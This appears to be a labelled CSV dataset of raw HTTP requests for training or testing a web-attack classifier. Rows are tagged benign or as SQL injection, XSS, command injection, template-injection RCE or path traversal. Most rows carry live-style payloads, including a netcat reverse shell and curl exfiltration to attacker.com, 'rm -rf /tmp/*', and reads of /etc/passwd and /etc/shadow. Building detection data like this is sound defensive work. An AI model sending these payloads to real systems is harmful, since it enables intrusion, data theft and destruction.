request_normalized,label
"GET /api/ping?host=; rm -rf /tmp/* HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /profile?bio=';alert(String.fromCharCode(88,83,83))// HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /eval?code={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /products?filter=' OR 1=1 LIMIT 1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /feedback?msg=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=| net user&submit=1",cmdi
"GET /api/products?category=tablet&page=25&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /products?filter=1 UNION SELECT null,password FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/ping?host=`id` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /images/img_8176.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /user?id=' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /assets?path=../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /user?id=' AND 1=2 UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<% Runtime.getRuntime().exec('id') %>&submit=1",rce
"GET /images/img_5541.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /user?id=' OR EXISTS(SELECT * FROM users WHERE username='admin')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=&& cat /etc/passwd&submit=1",cmdi
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=1 && dir&submit=1",cmdi
"GET /user?id=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=| nc attacker.com 4444 -e /bin/bash&submit=1",cmdi
"POST /api/users/1976/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""jane_smith"",""email"":""user@example.com""}",benign
"GET /comment?text=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

input=java.lang.Runtime.exec('id')&submit=1",rce
"GET /search?q=<iframe src='javascript:alert(1)'></iframe> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=& ipconfig&submit=1",cmdi
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=| nslookup attacker.com&submit=1",cmdi
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""jane_smith"",""password"":""5171f413""}",benign
"GET /view?doc=����/����/etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<details open ontoggle=alert(1)>&submit=1",xss
"GET /profile?bio=<IMG SRC=JaVaScRiPt:alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/ping?host=; ls -la HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

input=#{7*7}&submit=1",rce
"GET /api/process?data={{7*7}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=../../../../../../../../../../etc/passwd&submit=1",path_traversal
"GET /api/ping?host=$(cat /etc/passwd) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=`php -r 'system(""id"");'`&submit=1",rce
"POST /api/users/2871/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""bob_jones"",""email"":""user@example.com""}",benign
"GET /profile?bio=<details open ontoggle=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /api/users/5173/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""jane_smith"",""email"":""user@example.com""}",benign
"GET /assets?path=../../../../etc/shadow HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /api/process?data=system('id') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /calc?formula=${T(java.lang.Runtime).getRuntime().exec('id')} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /search?q='-alert(1)-' HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /api/ping?host=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=| type C:\Windows\win.ini&submit=1",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

input=<IMG SRC=JaVaScRiPt:alert('XSS')>&submit=1",xss
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=bob_jones&email=user@example.com&message=Hello World",benign
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

input=../../../etc/passwd&submit=1",path_traversal
"GET /profile?bio=<svg onload=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/items?name=' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=file:///etc/passwd&submit=1",path_traversal
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input='-alert(1)-'&submit=1",xss
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

input=<input type=text value='' onfocus=alert(1) autofocus>&submit=1",xss
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

input=../../etc/passwd&submit=1",path_traversal
"GET /comment?text=<a href='javascript:alert(1)'>click me</a> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=john_doe&email=admin@test.org&message=Hello World",benign
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<?php passthru('cat /etc/passwd'); ?>&submit=1",rce
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

input=../../../etc/passwd&submit=1",path_traversal
"GET /template?expr=java.lang.Runtime.exec('id') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /exec?cmd=| whoami HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=eval(base64_decode('c3lzdGVtKCdpZCcp'));&submit=1",rce
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

input=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>&submit=1",xss
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

input=' OR 'x'='x&submit=1",sqli
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input='-alert(1)-'&submit=1",xss
"GET /tools/lookup?domain=| curl http://attacker.com/$(whoami) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /images/img_2839.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /profile?bio=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/items?name=' UNION SELECT *, NULL FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /template?expr=<?php passthru('cat /etc/passwd'); ?> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=[[${7*7}]]&submit=1",rce
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

input=| curl http://attacker.com/$(whoami)&submit=1",cmdi
"GET /news/article/getting-started HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

input=' OR ''='&submit=1",sqli
"GET /admin/run?input=&& cat /etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /eval?code=<% Runtime.getRuntime().exec('id') %> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/items?name=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<details open ontoggle=alert(1)>&submit=1",xss
"GET /assets?path=../../../../etc/shadow HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=../../../../../../../../../../etc/passwd&submit=1",path_traversal
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

input=../////etc/////passwd&submit=1",path_traversal
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

input=eval(compile('import os; os.system(""id"")', 'string', 'exec'))&submit=1",rce
"GET /search?q=music&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=fdf7f024fc31ee5f",benign
"GET /products?filter=' UNION SELECT *, NULL FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""john_doe"",""password"":""d382fbab""}",benign
"GET /eval?code={{lipsum.__globals__['os'].popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /news/article/getting-started HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

input=java.lang.Runtime.exec('id')&submit=1",rce
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

input=""><script>alert(document.cookie)</script>&submit=1",xss
"GET /products?filter=' OR ''=' HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /image?src=..\..\..\windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=../../../proc/self/environ&submit=1",path_traversal
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=exec('import os; os.system(""calc.exe"")')&submit=1",rce
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

input=`id`&submit=1",cmdi
"GET /api/ping?host=& echo test > /tmp/pwned HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /assets?path=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116

input={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}&submit=1",rce
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

input=1' OR 1=1--&submit=1",sqli
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<img src=x onerror=alert('XSS')>&submit=1",xss
"GET /admin/run?input=| nslookup attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=exec('import os; os.system(""calc.exe"")')&submit=1",rce
